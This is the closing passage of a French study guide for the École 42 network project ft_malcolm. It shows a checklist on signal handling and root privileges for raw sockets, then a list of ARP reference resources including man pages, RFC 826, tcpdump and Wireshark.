- [ ] Je sais gérer Ctrl+C proprement avec `signal()`
- [ ] Mon programme doit tourner en **root** (raw sockets = privilèges root)

---

## Ressources complémentaires

- `man 7 packet` — Documentation des raw sockets AF_PACKET sous Linux
- `man 7 arp` — Documentation du protocole ARP sous Linux
- `man 3 inet_pton` — Conversion d'adresses IP
- RFC 826 — Spécification originale du protocole ARP (courte et lisible)
- `tcpdump -i eth0 arp -v` — Observer les échanges ARP en temps réel sur ton réseau
- `wireshark` — Observer et analyser les trames ARP graphiquement

---

*Document préparé pour le projet ft_malcolm — École 42*
